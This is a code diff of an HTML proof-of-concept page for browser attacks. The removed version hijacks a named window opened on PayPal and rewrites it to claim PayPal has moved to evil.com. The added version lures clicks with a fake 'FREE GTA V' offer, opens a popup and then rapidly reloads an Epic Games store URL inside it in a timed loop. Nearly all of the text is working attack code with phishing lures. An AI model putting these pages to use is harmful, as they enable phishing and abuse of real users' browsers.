@@ -1,8 +1,22 @@
-<script>
-function pwned() {
-var t = window.open('', 'ss');
-t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
-t.stop();
-}
-</script>
-<a href="https://Paypal.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
+<html>
+	<head>
+		<script>
+			function next() {
+				w.location.replace('https://www.epicgames.com/store/en-US/promotion/mega-sale/?'+n);
+				n++;
+
+				setTimeout("next();",15);
+				setTimeout("next();",25);
+			}
+
+			function f() {
+				w = window.open("attack1.html", "_blank", "width=500 height=500");
+				i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); n = 0; next(); }", 5);
+			}
+		</script>
+	</head>
+
+	<body>
+		<a href="#" onclick="f()">FREE GTA V - VALID TILL 21st MAY</a>
+	</body>
+</html>
